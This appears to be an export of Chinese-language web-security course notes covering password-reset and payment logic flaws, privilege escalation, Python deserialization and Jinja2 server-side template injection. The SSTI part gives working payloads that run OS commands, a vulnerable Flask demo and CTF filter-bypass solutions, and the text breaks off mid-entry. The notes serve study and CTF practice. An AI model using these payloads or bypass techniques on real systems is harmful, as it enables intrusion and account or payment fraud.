        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>97、找回修改机制-验证码突破-回传显示&amp;规律爆破</li><li>98、找回修改机制-验证目标-重定向用户&amp;重定向发送</li><li>99、找回修改机制-验证逻辑-修改响应包&amp;跳过步骤URL</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/12/15/74WEB%E6%94%BB%E9%98%B2-%E6%9C%BA%E5%88%B6%E9%AA%8C%E8%AF%81/%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE.png"><br> <img src="/2023/12/15/74WEB%E6%94%BB%E9%98%B2-%E6%9C%BA%E5%88%B6%E9%AA%8C%E8%AF%81/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E.png"></p><h2 id="验证码突破-回传显示-规律爆破"><a href="#验证码突破-回传显示-规律爆破" class="headerlink" title="验证码突破-回传显示&amp;规律爆破"></a>验证码突破-回传显示&amp;规律爆破</h2><p>演示：某APP验证码爆破 某目标回显显示<br>1、通过手机找回密码，响应包中包含短信验证码。<br>2、找回密码时使用位数较少的短信验证码，或者验证码没有设置有效时间限制，导致攻击者借助自动化工具在一定时间范围内爆破获得短信验证码，从而导致重置任意账号密码。  </p><h2 id="验证目标-重定向发送-重定向用户"><a href="#验证目标-重定向发送-重定向用户" class="headerlink" title="验证目标-重定向发送&amp;重定向用户"></a>验证目标-重定向发送&amp;重定向用户</h2><p>演示：某CMS重定向用户 某CMS重定向发送<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、当我们输入正确的手机号和正确的短信验证码，然后进入重置密码的最后一步，也就是输入新的密码，输入密码后提交到服务端的post数据包需要包含当前用户的身份信息。而一般网站是通过用户名或用户ID来标识用户身份的，如果这个用户名或用户ID没有和当前手机号、短信验证码进行绑定。也就是说服务端只验证用户名、ID是否存在，而不去验证用户和当前手机号是否匹配，那么我们就可以通过修改用户名、ID去修改其他用户的密码了。当然可以修改的地方不限于找回密码的数据包，比如修改资料的地方也可能存在这样的漏洞。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、如果数据包存在发送验证邮箱或目标地址，尝试修改到自己接受地，实现拦截获取  </p><h2 id="验证逻辑-修改响应包-跳过步骤URL"><a href="#验证逻辑-修改响应包-跳过步骤URL" class="headerlink" title="验证逻辑-修改响应包&amp;跳过步骤URL"></a>验证逻辑-修改响应包&amp;跳过步骤URL</h2><p>演示：某APP修改响应包 某APP跳过步骤URL<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、通过手机找回密码一般需要短信验证码验证，服务端需要告诉客户端，输入的验证码是否正确，如果客户端收到true的信息，那么就会向带着true的信息向服务端请求进入下一步，而服务端收到true的信息，就会允许客户端进入下一步，反之，如果是false的信息，服务端就不会允许客户端进入下一步。也就是说我们进入下一步的关键是让服务端收到客户端的true信息，而借助burpsuite，我们可以修改服务端返回到客户端的信息，这样一来，我们就可以输入任意短信验证码，然后将服务端返回的false信息改为true就可以绕过短信验证码的验证了。<br>2、找回密码流程一般需要四个步骤：<br>流程：验证用户名-验证短信验证码-输入新密码-重置成功<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这四个步骤应该紧紧相连，互相相关，只有通过了第一个步骤验证才可以进入下一个步骤，如果每个步骤之间没有进行关联性验证，就可能导致跳过关键验证步骤，从而导致重置任意账号密码。  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>73WEB攻防-支付逻辑</title>
      <link href="/2023/12/15/73WEB%E6%94%BB%E9%98%B2-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/"/>
      <url>/2023/12/15/73WEB%E6%94%BB%E9%98%B2-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>94、支付逻辑-商品本身-修改-数量&amp;价格&amp;属性等</li><li>95、支付逻辑-营销折扣-优惠券&amp;积分&amp;签约&amp;试用等</li><li>96、支付逻辑-订单接口-替换&amp;并发&amp;状态值&amp;越权支付等</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/12/15/73WEB%E6%94%BB%E9%98%B2-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91.png"></p><h2 id="支付逻辑常见测试："><a href="#支付逻辑常见测试：" class="headerlink" title="支付逻辑常见测试："></a>支付逻辑常见测试：</h2><ul><li>1、熟悉常见支付流程<br>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付  </li><li>2、熟悉那些数据篡改<br>商品ID，购买价格，购买数量，订单属性，折扣属性，支付方式，支付状态等  </li><li>3、熟悉那些修改方式<br>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等  </li><li>4、熟悉那些另类方法<br>无限试用，越权支付，并发兑换，四舍五入半价购，循环利用优惠券，支付签约逻辑等</li></ul><h2 id="支付逻辑如何挖掘："><a href="#支付逻辑如何挖掘：" class="headerlink" title="支付逻辑如何挖掘："></a>支付逻辑如何挖掘：</h2><ul><li>1、找到关键的数据包<br>可能一个支付操作有三四个数据包，我们要对数据包进行挑选。  </li><li>2、分析数据包<br>支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠等）<br>要尝试对数据包中的各个参数进行分析。  </li><li>3、不按套路出牌<br>多去想想开发者没有想到的地方，如算法拼接，关闭开启返优惠券等  </li><li>4、PC端尝试过，APP端也看看，小程序也试试</li></ul><h2 id="支付逻辑安全修复："><a href="#支付逻辑安全修复：" class="headerlink" title="支付逻辑安全修复："></a>支付逻辑安全修复：</h2><p>1、在后端检查订单的每一个值，包括支付状态；<br>2、校验价格、数量参数，比如产品数量只能为整数，并限制最大购买数量 ；<br>3、与第三方支付平台检查，实际支付的金额是否与订单金额一致；<br>4、如给用户退款，要使用原路、原订单退回。如：退押金，按用户原支付订单原路退回；<br>5、加密、解密、数字签名及验证，这个可以有效避免数据修改，重放攻击中的各种问题；<br>6、金额超过指定值，进行人工审核等。  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>72WEB攻防-业务逻辑</title>
      <link href="/2023/12/12/72WEB%E6%94%BB%E9%98%B2-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"/>
      <url>/2023/12/12/72WEB%E6%94%BB%E9%98%B2-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>91、逻辑越权-检测原理-水平&amp;垂直&amp;未授权</li><li>92、逻辑越权-检测项目-BURP插件&amp;对比项目</li><li>93、SRC挖掘-实战越权及未授权挖掘分享案例</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/12/12/72WEB%E6%94%BB%E9%98%B2-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%911.png"><br> <img src="/2023/12/12/72WEB%E6%94%BB%E9%98%B2-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%912.png"></p><h2 id="逻辑越权-检测原理-水平-垂直-未授权"><a href="#逻辑越权-检测原理-水平-垂直-未授权" class="headerlink" title="逻辑越权-检测原理-水平&amp;垂直&amp;未授权"></a>逻辑越权-检测原理-水平&amp;垂直&amp;未授权</h2><p>1、水平越权：同级别的用户之间权限的跨越<br>2、垂直越权：低级别用户到高级别用户权限的跨越<br>3、未授权访问：通过无级别用户能访问到需验证应用<br>PHPStudy + Metinfo4.0 + 会员后台中心  </p><h2 id="逻辑越权-检测项目-BURP插件-对比项目"><a href="#逻辑越权-检测项目-BURP插件-对比项目" class="headerlink" title="逻辑越权-检测项目-BURP插件&amp;对比项目"></a>逻辑越权-检测项目-BURP插件&amp;对比项目</h2><ul><li>1、检测插件：<br><a href="https://github.com/smxiazi/xia_Yue">https://github.com/smxiazi/xia_Yue</a><br><a href="https://github.com/VVeakee/auth-analyzer-plus">https://github.com/VVeakee/auth-analyzer-plus</a>  </li><li>2、检测项目：<br><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a><br><a href="https://github.com/y1nglamore/IDOR_detect_tool">https://github.com/y1nglamore/IDOR_detect_tool</a></li></ul><p>实战：找到当前用户相关的参数名，添加返回包里面的参数名参数值去提交；<br>参数值请求数据加密：JS中找逆向算法，还原算法重新修改发包测试；<br>请求包带token：直接复用和删除测试。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>71WEB攻防-python安全2</title>
      <link href="/2023/12/12/71WEB%E6%94%BB%E9%98%B2-python%E5%AE%89%E5%85%A82/"/>
      <url>/2023/12/12/71WEB%E6%94%BB%E9%98%B2-python%E5%AE%89%E5%85%A82/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>88、Python-PYC-反编译文件出源码</li><li>89、Python-反序列化-调用链&amp;魔术方法</li><li>90、Python-格式化字符串-类魔术方法引用</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="Python-PYC-反编译文件出源码"><a href="#Python-PYC-反编译文件出源码" class="headerlink" title="Python-PYC-反编译文件出源码"></a>Python-PYC-反编译文件出源码</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pyc文件是py文件编译后生成的字节码文件(byte code)，pyc文件经过python解释器最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class文件，一般py文件改变后，都会重新生成pyc文件。<br>真题：<a href="http://pan.baidu.com/s/1jGpB8DS">http://pan.baidu.com/s/1jGpB8DS</a><br>安装：pip install uncompyle6<br>使用：uncompyle6 -o test.py test.pyc<br>下载：<a href="https://github.com/rocky/python-uncompyle6">https://github.com/rocky/python-uncompyle6</a>  </p><h2 id="Python-反序列化-调用链-魔术方法"><a href="#Python-反序列化-调用链-魔术方法" class="headerlink" title="Python-反序列化-调用链&amp;魔术方法"></a>Python-反序列化-调用链&amp;魔术方法</h2><p>各类语言序列化和反序列化函数：<br>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等<br>PHP： serialize()、 unserialize()<br>Python：pickle marshal json PyYAML shelve PIL unzip  </p><p>序列化：把类对象转化为字节流或文件<br>反序列化：将字节流或文件转化为类对象  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump(obj, file) : 将对象序列化后保存到文件</span><br><span class="line">pickle.load(file) : 将文件序列化内容反序列化为对象</span><br><span class="line">pickle.dumps(obj) : 将对象序列化成字符串格式的字节流</span><br><span class="line">pickle.loads(bytes_obj) : 将字符串字节流反序列化为对象</span><br><span class="line">PyYAML yaml.load()</span><br><span class="line">JSON json.loads(s)</span><br><span class="line">marshal</span><br></pre></td></tr></table></figure><p>魔术方法：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reduce() 反序列化时调用</span><br><span class="line">reduce_ex() 反序列化时调用</span><br><span class="line">setstate() 反序列化时调用（类似于php的isset被设置）</span><br><span class="line">getstate() 序列化时调用</span><br></pre></td></tr></table></figure><p>1、序列化和反序列化演示-test.py<br>2、序列化和反序列化形成-test.py<br>3、序列化和反序列化利用-server.py pop.py<br>4、序列化和反序列化赛题-[watevrCTF-2019]Pickle Store<br>黑盒：Python反序列化特征：base64编码 前面gA固定（序列化数据）<br>测试：直接提交构造的payload测试  </p><h2 id="Python-格式化字符串-类魔术方法引用"><a href="#Python-格式化字符串-类魔术方法引用" class="headerlink" title="Python-格式化字符串-类魔术方法引用"></a>Python-格式化字符串-类魔术方法引用</h2><p><a href="https://xz.aliyun.com/t/3569">https://xz.aliyun.com/t/3569</a><br>第一种：%操作符<br>第二种：string.Template<br>第三种：调用format方法 （可控格式化字符串）<br>第四种: f-Strings（可控格式化字符串）  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>70WEB攻防-python安全1</title>
      <link href="/2023/12/11/70WEB%E6%94%BB%E9%98%B2-python%E5%AE%89%E5%85%A81/"/>
      <url>/2023/12/11/70WEB%E6%94%BB%E9%98%B2-python%E5%AE%89%E5%85%A81/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>87、Python安全-SSTI注入-类型&amp;形成&amp;利用&amp;项目</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/12/11/70WEB%E6%94%BB%E9%98%B2-python%E5%AE%89%E5%85%A81/python.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 </span><br><span class="line">__mro__              method resolution order，即解析方法调用的顺序；此属性是由类组成的元            组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且get_flashed_messages.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1        get传参</span><br><span class="line">request.values.x1      所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1       post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data           post传参    (Content-Type:a/b)</span><br><span class="line">request.json         post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="1、什么是SSTI"><a href="#1、什么是SSTI" class="headerlink" title="1、什么是SSTI"></a>1、什么是SSTI</h2><p>SSTI（Server Side Template Injection，服务器端模板注入）<br>服务端接收攻击者的输入，将其作为Web应用模板内容的一部分<br>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容,从而导致信息泄露、代码执行、GetShell等问题，其影响范围取决于模版引擎复杂性，<br>注意：模板引擎和渲染函数本身是没有漏洞的,该漏洞产生原因在于模板可控引发代码注入  </p><h2 id="2、各语言框架SSTI"><a href="#2、各语言框架SSTI" class="headerlink" title="2、各语言框架SSTI"></a>2、各语言框架SSTI</h2><p>PHP：smarty、twig<br>Python：jinja2、mako、tornad、Django<br>java：Thymeleaf、jade、velocity、FreeMarker<br>其他：<a href="https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI">https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI</a>  </p><h2 id="3、Python-SSTI形成"><a href="#3、Python-SSTI形成" class="headerlink" title="3、Python-SSTI形成"></a>3、Python-SSTI形成</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, default=<span class="string">&#x27;xiaodi&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="comment"># 将一段字符串作为模板进行渲染</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><h2 id="4、Python-SSTI利用"><a href="#4、Python-SSTI利用" class="headerlink" title="4、Python-SSTI利用"></a>4、Python-SSTI利用</h2><p>判断利用  </p><ul><li>1、看那些类可用  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></li><li>2、找利用类索引  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;os._wrap_close&#x27;&gt;</span><br></pre></td></tr></table></figure></li><li>3、找利用类方法  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[133].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure></li><li>4、构造利用类方法  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[133].__init__.__globals__.popen(&#x27;calc&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure></li><li>5、其他：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[133].__init__.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;calc&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure></li><li>6、其他引用：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config：&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;</span><br><span class="line">url_for：&#123;&#123;url_for.__globals__.os.popen(&#x27;calc&#x27;)&#125;&#125;</span><br><span class="line">lipsum：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;</span><br><span class="line">get_flashed_messages：&#123;&#123;get_flashed_messages.__globals__[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>绕过限制-CtfShow项目<br>参考：<br><a href="https://www.cnblogs.com/tuzkizki/p/15394415.html">https://www.cnblogs.com/tuzkizki/p/15394415.html</a><br><a href="https://blog.csdn.net/m0_74456293/article/details/129429424">https://blog.csdn.net/m0_74456293/article/details/129429424</a></li></ul><h3 id="Web-361-无过滤"><a href="#Web-361-无过滤" class="headerlink" title="Web 361 无过滤"></a>Web 361 无过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Web-362-过滤数字2-3"><a href="#Web-362-过滤数字2-3" class="headerlink" title="Web 362 过滤数字2 3"></a>Web 362 过滤数字2 3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Web-363-过滤单引号"><a href="#Web-363-过滤单引号" class="headerlink" title="Web 363 过滤单引号"></a>Web 363 过滤单引号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read()&#125;&#125;&amp;a=os&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h3 id="Web-364-过滤单引号-args"><a href="#Web-364-过滤单引号-args" class="headerlink" title="Web 364 过滤单引号+args"></a>Web 364 过滤单引号+args</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[request.values.a].popen(request.values.b).read()&#125;&#125;&amp;a=os&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h3 id="Web-365-过滤了中括号"><a href="#Web-365-过滤了中括号" class="headerlink" title="Web 365 过滤了中括号"></a>Web 365 过滤了中括号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__.os.popen(request.values.c).read()&#125;&#125;&amp;c=cat /flag</span><br></pre></td></tr></table></figure><h3 id="Web-366-过滤了下划线"><a href="#Web-366-过滤了下划线" class="headerlink" title="Web 366 过滤了下划线"></a>Web 366 过滤了下划线</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 